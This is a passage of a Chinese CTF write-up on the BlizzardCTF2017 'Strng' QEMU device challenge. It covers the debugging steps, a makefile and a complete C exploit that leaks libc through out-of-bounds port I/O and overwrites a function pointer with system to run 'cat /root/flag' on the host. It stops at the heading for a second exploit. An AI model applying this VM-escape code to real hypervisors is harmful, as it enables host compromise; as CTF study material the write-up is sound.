
使用越界写漏洞，覆盖`regs`数组后面的`rand_r`地址，将其覆盖为`system`地址。

最后使用`strng_mmio_write`触发执行`opaque->rand_r(&opaque->regs[2])`函数，从而实现`system("cat /root/flag")`的调用，拿到flag。

## 3.3 调试

将完整流程描述了一遍以后，再说下怎么调试。

`sudo` `./launsh.sh`将虚拟机跑起来以后，在本地将`exp`用命令`make`编译通过，`makefile`内容比较简单：

### 3.3.1 makefile

```makefile
ALL: cc -m32 -O0 -static -o exp exp.c
```

### 3.3.2 exp.c

原来的`exp`存在以下问题，经过改造成功执行。

1. `libc`偏移不一样。
2. 不需要泄露堆地址，不过学习到了`STRNGState`对象位于`host`堆中。
3. 应该后面放`cat /root/flag`参数，否则前面会覆盖掉。

![图片描述](https://bbs.kanxue.com/upload/attach/202107/579999_RVCZHEGWMGMTS55.png)

第一种`exp`

```c
/* Author: raycp File: exp.c Description: exp for BlizzardCTF2017-Strng, out-of-bound access with pmio Date: 2019-08-04 */
#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/io.h>

unsigned char *mmio_mem;
uint32_t pmio_base = 0xc050;

void die(const char *msg) {
    perror(msg);
    exit(-1);
}

void mmio_write(uint32_t addr, uint32_t value) {
    *((uint32_t *)(mmio_mem + addr)) = value;
}

uint32_t mmio_read(uint32_t addr) {
    return *((uint32_t *)(mmio_mem + addr));
}

uint32_t pmio_write(uint32_t addr, uint32_t value) {
    outl(value, addr);
}

uint32_t pmio_read(uint32_t addr) {
    return (uint32_t)inl(addr);
}

uint32_t pmio_arbread(uint32_t offset) {
    pmio_write(pmio_base + 0, offset);
    return pmio_read(pmio_base + 4);
}

void pmio_abwrite(uint32_t offset, uint32_t value) {
    pmio_write(pmio_base + 0, offset);
    pmio_write(pmio_base + 4, value);
}

int main(int argc, char *argv[]) {
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1) die("mmio_fd open failed");
    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED) die("mmap mmio_mem failed");
    printf("mmio_mem @ %p\n", mmio_mem);
    if (iopl(3) != 0) die("I/O permission is not enough");
    uint64_t srandom_addr = pmio_arbread(0x108);
    srandom_addr = srandom_addr << 32;
    srandom_addr += pmio_arbread(0x104);
    printf("leaking srandom addr: 0x%llx\n", srandom_addr);
    uint64_t libc_base = srandom_addr - 0x00043cd0;
    uint64_t system_addr = libc_base + 0x0004f550;
    printf("libc base: 0x%llx\n", libc_base);
    printf("system addr: 0x%llx\n", system_addr);
    pmio_abwrite(0x114, system_addr & 0xffffffff);
    mmio_write(8, 0x20746163);
    mmio_write(12, 0x6f6f722f);
    mmio_write(16, 0x6c662f74);
    mmio_write(20, 0x6761);
    puts("see cat flag\n b *strng_mmio_write\n");
    getchar();
    mmio_write(0xc, 0);
}
```

第二种`exp`
